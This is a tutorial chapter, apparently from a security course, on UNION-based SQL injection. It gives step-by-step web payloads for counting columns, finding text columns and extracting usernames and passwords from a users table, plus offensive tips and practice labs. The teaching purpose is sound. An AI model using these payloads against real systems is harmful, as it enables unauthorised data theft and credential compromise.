# Chapter 06 — UNION-Based SQL Injection

## About the Topic
`UNION` combines the results of two `SELECT` statements. If an injection
point lets you append your own `SELECT`, you can pull **arbitrary data**
from **any table** directly into the page's normal output — the most
direct form of data exfiltration.

Two requirements for a working UNION attack:
1. The injected `SELECT` must return the **same number of columns** as the
   original query.
2. The corresponding columns must have **compatible data types**.

## Practical Example — Step by Step

**Step 1 — Find the column count** (using `ORDER BY` or `UNION SELECT NULL`):

```sql
?category=Gifts' ORDER BY 1--
?category=Gifts' ORDER BY 2--
?category=Gifts' ORDER BY 3--   -- errors here = only 2 columns exist
```

or

```sql
?category=Gifts' UNION SELECT NULL,NULL--     -- adjust NULL count until no error
```

**Step 2 — Find which columns are visible/text-compatible:**

```sql
?category=Gifts' UNION SELECT 'a','b'--
```
If `a` or `b` appears on the page, that column position is usable for data
extraction.

**Step 3 — Pull real data:**

```sql
?category=Gifts' UNION SELECT username, password FROM users--
```

Now usernames/passwords render directly on the product listing page.

**Step 4 — Enumerate other databases' schema (see Ch. 11) and repeat.**

## Offensive Tips
- Use `NULL` as a filler value when testing column count/types — it's
  compatible with almost every column type.
- If the app only renders one column, `CONCAT()` multiple values into a
  single field: `UNION SELECT CONCAT(username,':',password),NULL FROM users--`
- Comment style depends on DBMS: MySQL `-- ` or `#`, Oracle/PostgreSQL/MSSQL
  `--`.

## Labs to Practice
- **PortSwigger Academy** — "UNION attacks" section: 
  - *SQL injection UNION attack, determining the number of columns returned by the query*
  - *SQL injection UNION attack, finding a column containing text*
  - *SQL injection UNION attack, retrieving data from other tables*
  - *SQL injection UNION attack, retrieving multiple values in a single column*
- **TryHackMe** — *SQL Injection* room, UNION-based task.
- **DVWA** — SQLi module, Medium/High security, practicing UNION extraction.

## Key Takeaway
UNION-based SQLi is the fastest way to exfiltrate data when the app renders
query results back to you — always try it before falling back to blind
techniques.
